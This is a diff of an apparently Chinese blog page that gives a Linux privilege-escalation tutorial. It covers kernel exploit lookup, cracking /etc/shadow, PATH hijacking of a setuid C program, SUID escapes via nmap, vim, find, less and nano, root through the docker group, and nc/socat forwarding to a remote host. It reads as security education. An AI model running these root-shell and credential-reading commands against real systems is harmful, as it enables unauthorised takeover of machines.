@@ -389,18 +389,17 @@
 <a id="more"></a>
 
 <h2 id="内核提权"><a href="#内核提权" class="headerlink" title="内核提权"></a>内核提权</h2><p>查看发行版本</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/issue</span><br><span class="line">cat /etc/*-release</span><br><span class="line">lsb_release -a</span><br></pre></td></tr></table></figure>
-
+<pre><code class="shell">cat /etc/issue
+cat /etc/*-release
+lsb_release -a</code></pre>
 <p>查看内核版本</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname -a</span><br></pre></td></tr></table></figure>
-
+<pre><code class="shell">uname -a</code></pre>
 <p>大多内核漏洞通过内核版本能很快查到</p>
 <p>用 kali 自带的 searchsploit 来搜索 exploitdb 中的漏洞利用代码</p>
 <blockquote>
 <p>根据自己的搜索结果，增加搜索选项，缩小结果范围</p>
 </blockquote>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchspoit priv esc linux 2.6 ubuntu</span><br></pre></td></tr></table></figure>
-
+<pre><code class="shell">searchspoit priv esc linux 2.6 ubuntu</code></pre>
 <p>利用第三方工具搜集信息</p>
 <p><a href="https://github.com/mzet-/linux-exploit-suggester" target="_blank" rel="noopener">linux-exploit-suggester</a></p>
 <blockquote>
@@ -427,16 +426,15 @@
 <p>./LinEnum.sh -r report -e /tmp/ -t</p>
 </blockquote>
 <p>当内核版本没有好用的exp对应的时候，可以检查磁盘格式</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/fstab</span><br></pre></td></tr></table></figure>
-
+<pre><code class="shell">cat /etc/fstab</code></pre>
 <p>和已经安装的程序</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dpkg -l</span><br><span class="line">rpm -qa</span><br></pre></td></tr></table></figure>
-
+<pre><code class="shell">dpkg -l
+rpm -qa</code></pre>
 <h2 id="明文-root-密码提权"><a href="#明文-root-密码提权" class="headerlink" title="明文 root 密码提权"></a>明文 root 密码提权</h2><p>大多 linux 系统的密码都和 /etc/passwd 和 /etc/shadow 这两个配置文件息息相关。passwd 里面存储了用户，shadow 里面存储了密码的 hash</p>
 <p>出于安全考虑 passwd 是全用户可读，root可写的，而 shadow 是仅 root 可读写的</p>
 <p><strong>检查文件权限</strong></p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /etc</span><br><span class="line">ls -l passwd shadow</span><br></pre></td></tr></table></figure>
-
+<pre><code class="shell">cd /etc
+ls -l passwd shadow</code></pre>
 <p><strong>/etc/passwd 可写</strong></p>
 <p>passwd 由冒号分割，第一列是用户名，第二列是密码，x 代表密码 hash 被放在 shadow 里面了</p>
 <p>如果 passwd 可写，我们就可以把 root 的密码字段替换成一个已知密码的 hash，这样系统在验证密码时以 passwd 的为准</p>
@@ -444,11 +442,12 @@
 <p>如果shadow可读，我们可以读走 root 的 hash，然后用 hashcat 或者 john 暴力破解。</p>
 <p><strong>启动终端</strong></p>
 <p>出于安全考虑，linux 要求用户必须从<strong>终端设备</strong>（tty）中输入密码，而不是标准输入（stdin）。换句话说，sudo 在你输入密码的时候本质上是读取了键盘，而不是 bash 里面输入的字符。因此为了能够输入密码，我们必须模拟一个终端设备。我们可以利用 python 启动一个终端</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c 'import pty;pty.spawn("/bin/sh")'</span><br></pre></td></tr></table></figure>
-
+<pre><code class="shell"> python -c &#39;import pty;pty.spawn(&quot;/bin/sh&quot;)&#39;</code></pre>
 <p>就用 python 建立了一个虚拟终端，然后就可以使用 sudo 等等命令了。</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python -c 'import pty;pty.spawn("/bin/sh")'</span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo su</span></span><br><span class="line">[sudo] password for ctf: </span><br><span class="line">Sorry, try again.</span><br></pre></td></tr></table></figure>
-
+<pre><code class="shell">python -c &#39;import pty;pty.spawn(&quot;/bin/sh&quot;)&#39;
+$ sudo su
+[sudo] password for ctf: 
+Sorry, try again.</code></pre>
 <h2 id="sudo-滥用"><a href="#sudo-滥用" class="headerlink" title="sudo 滥用"></a>sudo 滥用</h2><p>sudo 是让普通用户使用超级用户的命令，其配置文件为 /etc/sudoers，文件定义可以执行 sudo 的账户、定义某个应用程序用 root 访问、是否需要密码验证。</p>
 <p>利用 <code>sudo -l</code> 查看当前用户可使用的 sudo 命令</p>
 <p>然后我们可以参考 <a href="https://gtfobins.github.io" target="_blank" rel="noopener">https://gtfobins.github.io</a> 进行提权</p>
@@ -456,9 +455,7 @@
 <p>强烈推荐此博客，它整理了 Unix 内部可用于绕过本地安全限制的二进制文件</p>
 </blockquote>
 <h2 id="计划任务提权"><a href="#计划任务提权" class="headerlink" title="计划任务提权"></a>计划任务提权</h2><p>系统内可能会有一些定时执行的任务，一般这些任务由 crontab 来管理，具有所属用户的权限。非 root 权限的用户是不可以列出 root 用户的计划任务的。但是 /etc 内系统的计划任务可以被列出</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -l /etc/cron*</span><br></pre></td></tr></table></figure>
-
-<p>默认这些程序以 root 权限执行，如果有幸遇到其中一个脚本被配置成任意用户可写，我们就可以修改脚本等反弹 root shell。</p>
+<pre><code>ls -l /etc/cron*</code></pre><p>默认这些程序以 root 权限执行，如果有幸遇到其中一个脚本被配置成任意用户可写，我们就可以修改脚本等反弹 root shell。</p>
 <blockquote>
 <p>rontab 计划任务千万不要写到 /etc/crontab 文件里。通过 crontab -e 去创建，让他写到默认的 /var/spool/cron下；创建任务时，避免使用 root 去创建任务，若用 root 创建任务，注意设置权限，避免 root 权限执行任务。</p>
 </blockquote>
@@ -468,108 +465,114 @@
 <p>参考：<a href="https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html</a></p>
 </blockquote>
 <p>命令行查找 SUID 文件</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -exec ls -ldb &#123;&#125;</span><br></pre></td></tr></table></figure>
-
+<pre><code class="shell">find / -user root -perm -4000 -print 2&gt;/dev/null
+find / -perm -u=s -type f 2&gt;/dev/null
+find / -user root -perm -4000 -exec ls -ldb {}</code></pre>
 <p>这里举一个例子：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    setuid(<span class="number">0</span>); <span class="comment">// 以root用户执行</span></span><br><span class="line">    system(<span class="string">"id"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
+<pre><code class="c">#include&lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+int main()
+{
+    setuid(0); // 以root用户执行
+    system(&quot;id&quot;);
+}</code></pre>
 <p>以 root 进行编译和权限设置</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gcc pri.c -o pri</span><br><span class="line">chmod u+s ./pri # 这里设置了SUID位</span><br><span class="line">ls -l</span><br></pre></td></tr></table></figure>
-
+<pre><code class="shell">gcc pri.c -o pri
+chmod u+s ./pri # 这里设置了SUID位
+ls -l</code></pre>
 <p>输出</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">total 24</span><br><span class="line">-rwsr-xr-x 1 root root 16616 May 27 05:59 pri</span><br><span class="line">-rw-r--r-- 1 root root    95 May 27 05:57 pri.c</span><br></pre></td></tr></table></figure>
-
+<pre><code class="shell">total 24
+-rwsr-xr-x 1 root root 16616 May 27 05:59 pri
+-rw-r--r-- 1 root root    95 May 27 05:57 pri.c</code></pre>
 <p>注意 s 属性，表示这个程序有 SUID 属性。</p>
 <p>接下来我们切换用户并执行可以发现提权成功</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su ctf</span><br><span class="line">./pri</span><br></pre></td></tr></table></figure>
-
+<pre><code class="shell">su ctf
+./pri</code></pre>
 <p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200527180236.png" alt="image-20200527180232737"></p>
 <p>而除了借助程序功能提权，我们还可以尝试劫持环境变量提权。上文的 pri 程序使用了 system 函数，system 函数是继承环境变量的，因此我们通过替换环境变量可以达到执行任意命令的效果。</p>
 <p>继续以上面的 pri 程序为例，我们来尝试劫持 id 命令，修改环境变量路径</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo $PATH</span><br><span class="line">export PATH=/tmp:$PATH</span><br></pre></td></tr></table></figure>
-
+<pre><code class="shell">echo $PATH
+export PATH=/tmp:$PATH</code></pre>
 <p><strong>方法一</strong></p>
 <p>修改 id 命令</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo '/bin/sh' &gt; /tmp/id</span><br><span class="line">chmod 777 /tmp/id</span><br></pre></td></tr></table></figure>
-
+<pre><code class="shell">echo &#39;/bin/sh&#39; &gt; /tmp/id
+chmod 777 /tmp/id</code></pre>
 <p><strong>方法二</strong></p>
 <p>直接复制一个 bash</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /bin/sh /tmp/id</span><br></pre></td></tr></table></figure>
-
+<pre><code class="shell">cp /bin/sh /tmp/id</code></pre>
 <p><strong>方法三</strong></p>
 <p>建立一个软链接（需要一定的权限）</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls -l /bin/sh /tmp/id</span><br><span class="line">export PATH=.:$PATH</span><br></pre></td></tr></table></figure>
-
+<pre><code class="shell">ls -l /bin/sh /tmp/id
+export PATH=.:$PATH</code></pre>
 <p>运行程序提权</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ./pri</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> whoami</span></span><br><span class="line">root</span><br><span class="line"><span class="meta">#</span><span class="bash"></span></span><br></pre></td></tr></table></figure>
-
+<pre><code class="shell">$ ./pri
+# whoami
+root
+#</code></pre>
 <p>这里列出一些常用的可用于 SUID 提权的文件</p>
 <blockquote>
 <p>这里我们也可以再次借鉴神博客 <a href="https://gtfobins.github.io" target="_blank" rel="noopener">https://gtfobins.github.io</a></p>
 </blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">- nmap</span><br><span class="line">- Vim</span><br><span class="line">- find</span><br><span class="line">- bash</span><br><span class="line">- more</span><br><span class="line">- less</span><br><span class="line">- nano</span><br><span class="line">- cp</span><br></pre></td></tr></table></figure>
-
-<p><strong>namp</strong></p>
+<pre><code>- nmap
+- Vim
+- find
+- bash
+- more
+- less
+- nano
+- cp</code></pre><p><strong>namp</strong></p>
 <p>较旧版本的 Nmap（2.02~5.21）带有交互模式，从而允许用户执行 shell 命令。由于 Nmap 位于上面使用root权限执行的二进制文件列表中，因此可以使用交互式控制台来运行具有相同权限的 shell。</p>
 <p>可以使用下命令进入namp交互模式</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --interactive</span><br></pre></td></tr></table></figure>
-
+<pre><code class="shell">nmap --interactive</code></pre>
 <p>执行命令后会返回一个shell</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">nmap&gt;</span><span class="bash"> !sh</span></span><br><span class="line">sh-3.2# whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>
-
+<pre><code class="shell">nmap&gt; !sh
+sh-3.2# whoami
+root</code></pre>
 <p>而在 Metasploit 中也有一个模块可以通过 SUID nmap 进行提权</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit/unix/local/setuid_nmap</span><br></pre></td></tr></table></figure>
-
+<pre><code class="shell">exploit/unix/local/setuid_nmap</code></pre>
 <p><strong>vim</strong></p>
 <p>Vim 的主要用途是用作文本编辑器。 但是，如果以 SUID 运行，它将继承 root 用户的权限，因此可以读取系统上的所有文件</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/shadow</span><br></pre></td></tr></table></figure>
-
+<pre><code class="shell">vim /etc/shadow</code></pre>
 <p><strong>find</strong></p>
 <p>如果 find 以 SUID 权限运行，所有通过 find 执行的命令都会以 root 权限运行</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">touch test</span><br><span class="line">find test -exec whoami \;</span><br></pre></td></tr></table></figure>
-
+<pre><code class="shell">touch test
+find test -exec whoami \;</code></pre>
 <p><strong>bash</strong></p>
 <p>以下命令将以 root 身份打开一个 bash shell</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bash -p</span><br><span class="line">bash-3.2# id</span><br><span class="line">uid=500(cow) gid=500(cow) euid=0(root) groups=500(cow)</span><br></pre></td></tr></table></figure>
-
+<pre><code class="shell">bash -p
+bash-3.2# id
+uid=500(cow) gid=500(cow) euid=0(root) groups=500(cow)</code></pre>
 <p><strong>less</strong></p>
 <p>程序 less 也可以执行提权后的 shell</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">less /etc/passwd</span><br><span class="line">!/bin/sh</span><br></pre></td></tr></table></figure>
-
+<pre><code class="shell">less /etc/passwd
+!/bin/sh</code></pre>
 <p><strong>nano</strong></p>
 <p>以下命令可以打开一个提权后的 shell</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./nano</span><br><span class="line">^R^X</span><br><span class="line">reset; sh 1&gt;&amp;0 2&gt;&amp;0</span><br></pre></td></tr></table></figure>
-
+<pre><code class="shell">./nano
+^R^X
+reset; sh 1&gt;&amp;0 2&gt;&amp;0</code></pre>
 <p><strong>cp</strong></p>
 <p>写文件</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LFILE=file_to_write</span><br><span class="line">echo "DATA" | ./cp /dev/stdin "$LFILE"</span><br></pre></td></tr></table></figure>
-
+<pre><code class="shell">LFILE=file_to_write
+echo &quot;DATA&quot; | ./cp /dev/stdin &quot;$LFILE&quot;</code></pre>
 <p>执行命令</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">LFILE=file_to_write</span><br><span class="line">TF=$(mktemp)</span><br><span class="line">echo "DATA" &gt; $TF</span><br><span class="line">./cp $TF $LFILE</span><br></pre></td></tr></table></figure>
-
+<pre><code class="shell">LFILE=file_to_write
+TF=$(mktemp)
+echo &quot;DATA&quot; &gt; $TF
+./cp $TF $LFILE</code></pre>
 <h2 id="Docker-组提权"><a href="#Docker-组提权" class="headerlink" title="Docker 组提权"></a>Docker 组提权</h2><p>docker 组用户提权，目的是利用 docker 组的用户来提权，因为 docker 组用户在容器下为 root 权限，通过挂载方式在容器下给本机添加 sudo 权限的用户，从而可以利用 sudo 命令。</p>
 <p>参考 <a href="https://fosterelli.co/privilege-escalation-via-docker.html" target="_blank" rel="noopener">https://fosterelli.co/privilege-escalation-via-docker.html</a></p>
 <p>普通用户执行这条命令就可以获得root权限</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -v /:/hostOS -i -t chrisfosterelli/rootplease</span><br></pre></td></tr></table></figure>
-
-<p>如果没有拥有 sudo 权限的用户，是无法执行 sudo 命令，在 kali 下会提示用户不在 sudoers 等提示。 </p>
+<pre><code>docker run -v /:/hostOS -i -t chrisfosterelli/rootplease</code></pre><p>如果没有拥有 sudo 权限的用户，是无法执行 sudo 命令，在 kali 下会提示用户不在 sudoers 等提示。 </p>
 <h2 id="服务漏洞"><a href="#服务漏洞" class="headerlink" title="服务漏洞"></a>服务漏洞</h2><p>有一些服务器的服务会被配置成对内网或者对本机开放。通过对他们的攻击我们有机会接触更多的敏感文件，或是运气足够好碰上一个远程 root 漏洞。</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -antup # 查看各种网络服务</span><br></pre></td></tr></table></figure>
-
+<pre><code class="shell">netstat -antup # 查看各种网络服务</code></pre>
 <p>如果找到些神秘的服务，可以用 netcat 或者 socat 等工具做端口转发</p>
 <p>nc 单向转发</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l 8080 | nc remote_host 4444</span><br></pre></td></tr></table></figure>
-
-<p>nc 双向转发</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkfifo backpipe nc -l 8080 0&lt;backpipe | nc remote_host 4444 1&gt;backpipe</span><br></pre></td></tr></table></figure>
-
+<pre><code>nc -l 8080 | nc remote_host 4444</code></pre><p>nc 双向转发</p>
+<pre><code class="shell">mkfifo backpipe nc -l 8080 0&lt;backpipe | nc remote_host 4444 1&gt;backpipe</code></pre>
 <p>socat tcp 转发</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat -d TCP4-LISTEN:80,reuseaddr,fork TCP4:remote_host:4444</span><br></pre></td></tr></table></figure>
-
-<p>socat udp 转发</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat -T 600 UDP4-LISTEN:5353,reuseaddr,fork UDP4:remote_host:4444</span><br></pre></td></tr></table></figure>
-
-<p>常见服务漏洞</p>
+<pre><code>socat -d TCP4-LISTEN:80,reuseaddr,fork TCP4:remote_host:4444</code></pre><p>socat udp 转发</p>
+<pre><code>socat -T 600 UDP4-LISTEN:5353,reuseaddr,fork UDP4:remote_host:4444</code></pre><p>常见服务漏洞</p>
 <ul>
 <li>redis</li>
 <li>mysql</li>
@@ -710,7 +713,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">29</span>
+                  <span class="site-state-item-count">30</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -723,7 +726,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-count">11</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
@@ -814,6 +817,17 @@
   <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
 -->
 
+
+
+
+
+<!-- Highlight.js -->
+<link rel="stylesheet" href="//cdn.bootcss.com/highlight.js/9.2.0/styles/github.min.css">
+<script src="//cdn.bootcss.com/highlight.js/9.2.0/highlight.min.js">
+</script>
+<script>
+    hljs.initHighlightingOnLoad();
+</script>
 
 
         
